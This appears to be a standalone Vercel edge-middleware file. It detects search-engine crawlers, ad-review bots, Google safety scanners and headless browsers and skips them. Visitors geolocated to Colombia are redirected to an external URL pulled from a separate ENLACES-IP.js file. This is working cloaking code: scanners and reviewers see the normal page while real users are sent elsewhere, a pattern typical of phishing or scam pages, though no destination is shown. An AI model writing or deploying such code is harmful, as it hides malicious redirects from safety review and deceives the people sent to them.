export const config = {
  matcher: ["/", "/index.html"]
};

function esBot(ua) {
  return /googlebot|googlebot-image|googlebot-video|googlebot-news|adsbot-google-mobile-apps|adsbot-google-mobile|adsbot-google|mediapartners-google|google-inspectiontool|storebot-google|googleother|google-safety|google-extended|google-cloudvertexbot|google-read-aloud|duplexweb-google|feedfetcher-google|apis-google|googleproducer|google-site-verification|google-adwords|google-ads|googleassociation|google-amphtml|google-pagerenderer|chrome-lighthouse|pagespeed|adidxbot|bingbot|bingpreview|microsoftpreview|msnbot-media|msnbot|skypeuripreview|linkedinbot|bingads|microsoft-advertising|facebookexternalhit|facebookcatalog|facebookbot|facebot|meta-externalads|meta-externalagent|meta-externalfetcher|meta-webindexer|headlesschrome|phantomjs|puppeteer|playwright/i.test(String(ua || ""));
}

export default async function middleware(request) {
  if (esBot(request.headers.get("user-agent"))) return;

  const country = String(request.headers.get("x-vercel-ip-country") || "").toUpperCase();
  if (country !== "CO") return;

  try {
    const js = await fetch(new URL("/ENLACES-IP.js", request.url), { cache: "no-store" }).then(function (r) {
      return r.text();
    });
    const match = js.match(/colombia\s*:\s*["']([^"']+)["']/);
    if (!match) return;
    const dest = match[1];
    const destUrl = new URL(dest, request.url);
    if (destUrl.origin === new URL(request.url).origin) return;
    return Response.redirect(dest, 302);
  } catch (e) {
    return;
  }
}
